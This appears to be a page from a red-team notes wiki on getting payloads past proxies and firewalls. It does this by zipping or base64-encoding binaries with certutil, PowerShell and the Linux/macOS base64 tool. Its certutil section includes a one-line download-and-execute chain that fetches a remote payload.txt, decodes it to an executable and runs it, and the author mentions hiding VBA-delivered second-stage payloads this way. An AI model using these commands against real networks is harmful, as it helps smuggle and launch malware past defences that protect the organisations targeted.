---
description: Using encoding and chunking of files to avoid conent detection
---

# Bypassing proxies and firewalls

Advanced proxies and firewalls can do SSL stripping and employ a variety of content inspection techniques. A well tuned defence could alert on or block the download of unusual file types such as executables or DLLs. In order to avoid this, payloads can be encoded or guised in a number of ways to appear as other file types. 

## As a zip

Zip files and passworded zip files can be used to hide files within if they are likely to be detected. Look for 7-zip or Win-Zip on the target system to be able to ustilise their encryption options. 

I've had reasonable success in obfuscating second stage payloads downloaded by VBA by hiding them within a .zip.

## As text files

By base64 encoding a binary, the content can be embeded within a larger text document or just moved into the environment "as is". 

This can be completed in a number of ways:

#### Certutil 

```text
#Encode binary
certutil -encode c:\zupdate.exe c:\zupdate.asc

#Decode binary
certutil -decode c:\zupdate.asc c:\zupdate.exe

#Chained decode after using certutil download functionality.
certutil.exe -urlcache -split -f "https://xenov.co.uk/payload.txt" payload.txt & certutil -decode payload.txt payload.exe & payload.exe

```

#### Powershell

```text
$source = "C:\Tools\Malware\zupdate.exe"
$sourceb64 = "C:\Tools\Malware\zupdate.txt"
$sourcebrebuild = "C:\Tools\Malware\zupdate-rebuild.exe"

#Convert binary to b64 encoded string & write to text file
[IO.File]::WriteAllBytes($sourceb64,[char[]][Convert]::ToBase64String([IO.File]::ReadAllBytes($source)))

#read b64 from text file, decode & write to binary file
[IO.File]::WriteAllBytes($sourcebrebuild, [Convert]::FromBase64String([char[]][IO.File]::ReadAllBytes($sourceb64)))
```

#### Base64 \(Linux & MacOS\)

```text
#Encode to Base64
base64 -i data.txt -o data.b64

#Decode a Base64 file
base64 -D -i data.b64 -o data.txt
```



